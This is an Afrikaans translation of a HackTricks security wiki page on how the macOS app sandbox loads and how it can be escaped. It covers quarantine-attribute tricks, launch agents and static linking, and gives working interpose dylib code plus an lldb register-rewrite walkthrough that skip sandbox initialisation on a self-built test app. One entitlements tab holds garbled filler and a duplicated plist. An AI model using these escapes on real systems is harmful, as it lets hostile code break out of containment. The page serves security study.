# macOS Sandboks Debuut & Omspring

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Sandboks laaiproses

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Afbeelding van <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

In die vorige afbeelding is dit moontlik om te sien **hoe die sandboks gelaai sal word** wanneer 'n toepassing met die toekenning **`com.apple.security.app-sandbox`** uitgevoer word.

Die kompilator sal `/usr/lib/libSystem.B.dylib` aan die binêre lê.

Dan sal **`libSystem.B`** ander verskeie funksies oproep totdat die **`xpc_pipe_routine`** die toekenning van die toepassing na **`securityd`** stuur. Securityd sal nagaan of die proses binne die Sandboks geïsoleer moet word, en indien wel, sal dit geïsoleer word.\
Uiteindelik sal die sandboks geaktiveer word met 'n oproep na **`__sandbox_ms`** wat **`__mac_syscall`** sal oproep.

## Moontlike Omspringe

### Omspring van karantynatribuut

**Lêers wat deur geïsoleerde prosesse geskep word**, word die **karantynatribuut** bygevoeg om te voorkom dat die sandboks ontsnap word. As jy egter daarin slaag om **'n `.app`-vouer sonder die karantynatribuut** binne 'n geïsoleerde toepassing te skep, kan jy die toepassingsbundel-binêre laat wys na **`/bin/bash`** en voeg 'n paar omgewingsveranderlikes in die **plist** by om **`open`** te misbruik om die nuwe toepassing sonder sandboks te laat begin.

Dit is wat gedoen is in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Daarom kan jy op hierdie oomblik, as jy net 'n vouer kan skep met 'n naam wat eindig op **`.app`** sonder 'n karantynatribuut, die sandboks ontsnap omdat macOS slegs die karantynatribuut in die **`.app`-vouer** en in die **hoofuitvoerbare lêer** nagaan (en ons sal die hoofuitvoerbare lêer na **`/bin/bash`** wys).

Let daarop dat as 'n .app-bundel reeds gemagtig is om uitgevoer te word (dit het 'n karantyn xttr met die gemagtig om te loop-vlag aan), kan jy dit ook misbruik... behalwe dat jy nou nie binne **`.app`**-bundels kan skryf nie tensy jy sekere bevoorregte TCC-permissies het (wat jy nie binne 'n hoë sandboks sal hê nie).
{% endhint %}

### Misbruik van Open-funksionaliteit

In die [**laaste voorbeelde van Word-sandboks-omspring**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kan gesien word hoe die **`open`**-opdraglynfunksionaliteit misbruik kan word om die sandboks te omseil.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Begin Agente/Demons

Selfs as 'n toepassing **bedoel is om geïsoleer te word** (`com.apple.security.app-sandbox`), is dit moontlik om die sandboks te omseil as dit vanaf 'n Beginagent uitgevoer word (`~/Library/LaunchAgents`) byvoorbeeld.\
Soos verduidelik in [**hierdie berig**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), as jy volharding wil verkry met 'n toepassing wat geïsoleer is, kan jy dit outomaties laat uitvoer as 'n Beginagent en dalk kwaadwillige kodes inspuit deur middel van DyLib-omgewingsveranderlikes.

### Misbruik van Outomatiese Beginplekke

As 'n geïsoleerde proses kan **skryf** op 'n plek waar **later 'n toepassing sonder sandboks die binêre gaan uitvoer**, sal dit in staat wees om te **ontsnap deur** die binêre daar te plaas. 'n Goeie voorbeeld van hierdie soort plekke is `~/Library/LaunchAgents` of `/System/Library/LaunchDaemons`.

Hiervoor mag jy selfs **2 stappe** nodig hê: Om 'n proses met 'n **meer inskiklike sandboks** (`file-read*`, `file-write*`) jou kode te laat uitvoer wat eintlik in 'n plek sal skryf waar dit **sonder sandboks uitgevoer sal word**.

Kyk na hierdie bladsy oor **Outomatiese Beginplekke**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Misbruik van ander prosesse

As jy vanuit die sandboksproses in staat is om **ander prosesse** wat in minder beperkende sandbokse (of geen) uitgevoer word, te **kompromitteer**, sal jy in staat wees om na hul sandbokse te ontsnap:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Staatlike Kompilering & Dinamiese skakeling

[**Hierdie navorsing**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) het 2 maniere ontdek om die Sandboks te omseil. Omdat die sandboks vanuit die gebruikersruimte toegepas word wanneer die **libSystem**-biblioteek gelaai word. As 'n binêre lêer dit kan vermy om dit te laai, sal dit nooit geïsoleer word nie:

* As die binêre lêer **volledig staties gekompileer** is, kan dit vermy om daardie biblioteek te laai.
* As die **binêre lêer nie enige biblioteke hoef te laai** nie (omdat die skakelaar ook in libSystem is), sal dit nie libSystem hoef te laai nie.&#x20;

### Skulpkodes

Let daarop dat **selfs skulpkodes** in ARM64 gekoppel moet word aan `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Toekennings

Let daarop dat selfs al mag sommige **aksies toegelaat word deur die sandboks**, as 'n toepassing 'n spesifieke **toekennings** het, soos in:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Vir meer inligting oor **Interposting**, kyk:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interposteer `_libsecinit_initializer` om die sandkas te voorkom
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interposteer `__mac_syscall` om die Sandboks te voorkom

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Foutopsporing en omseiling van Sandboks met lldb

Laten ons 'n toepassing saamstel wat gesandboks moet word:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}

Hierdie lêer bevat die toestemmings wat aan 'n toepassing in die macOS-sandbox toegeken word. Die toestemmings bepaal watter hulpbronne en funksies die toepassing mag gebruik. Hierdie lêer kan aangepas word om sekere beperkings te omseil en toegang tot beperkte hulpbronne te verkry.

Die inhoud van die lêer moet in XML-formaat wees en spesifieke sleutels en waardes moet ingesluit word om die toestemmings te definieer. Hier is 'n voorbeeld van hoe die lêer lyk:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <true/>
    <key>com.apple.security.network.client</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>
</dict>
</plist>
```

In hierdie voorbeeld word drie toestemmings toegeken aan die toepassing: `com.apple.security.app-sandbox`, `com.apple.security.network.client`, en `com.apple.security.files.user-selected.read-write`. Die waardes van hierdie sleutels is `true`, wat beteken dat die toepassing toegang het tot die betrokke hulpbronne.

Dit is belangrik om op te let dat die aanpassing van hierdie lêer 'n potensiële veiligheidsrisiko kan skep, aangesien dit die beperkings van die sandbox omseil. Dit moet slegs gedoen word as dit absoluut noodsaaklik is en met groot omsigtigheid.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Kompileer dan die app:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Die app sal probeer om die lêer **`~/Desktop/del.txt`** te **lees**, wat die **Sandbox nie sal toelaat nie**.\
Skep 'n lêer daar aangesien, sodra die Sandbox omseil is, sal dit in staat wees om dit te lees:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Laat ons die toepassing ontleed om te sien wanneer die Sandboks gelaai word:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Selfs met die omseiling van die Sandboks, sal TCC** die gebruiker vra of hy die proses wil toelaat om lêers vanaf die lessenaar te lees.
{% endhint %}

## Verwysings

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
